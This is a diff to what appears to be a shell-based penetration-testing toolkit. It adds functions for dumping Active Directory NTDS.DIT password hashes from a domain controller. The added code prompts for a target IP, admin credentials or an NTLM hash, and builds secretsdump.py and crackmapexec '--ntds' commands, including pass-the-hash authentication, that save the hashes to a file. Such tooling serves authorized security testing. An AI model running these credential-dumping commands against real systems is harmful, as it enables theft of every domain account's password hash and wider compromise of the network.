@@ -15,6 +15,7 @@ Commands
 nb-ad-dump-install         installs dependencies
 nb-ad-dump-secrets         dump secrets from the remote machine
 nb-ad-dump-ntds            extract only NTDS.DIT data (NTLM hashes only)
+nb-ad-dump-cme-ntds        extract only NTDS.DIT data with CME (NTLM hashes only)
 
 DOC
 }
@@ -71,6 +72,45 @@ nb-ad-dump-ntds() {
         __ask "Enter a domain admin password for authentication"
         nb-vars-set-pass
         print -z "secretsdump.py ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} -just-dc-ntlm | tee -a ${__domainadpath}/NTDS-hashdump.txt"
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the domain admin NTLM hash for authentication"
+        nb-vars-set-pass
+        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} -just-dc-ntlm | tee -a ${__domainadpath}/NTDS-hashdump.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
+}
+
+nb-ad-dump-cme-ntds() {
+    __check-project
+
+    __ask "Provide IP of domain controller"
+    nb-vars-set-rhost
+
+    __ask "Provide domain admin username"
+    nb-vars-set-user
+    echo
+
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        __ask "Do you want to add a domain? (y/n)"
+        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
+
+        if [[ $add_domain == "y" ]]; then
+            __ask "Enter the domain"
+            nb-vars-set-domain
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --ntds | tee -a ${__domainadpath}/NTDS-hashdump.txt"
+        else
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__RHOST} -u ${__USER} -p '${__PASS}' --ntds | tee -a ${__domainadpath}/NTDS-hashdump.txt"
+        fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the domain admin NTLM hash for authentication"
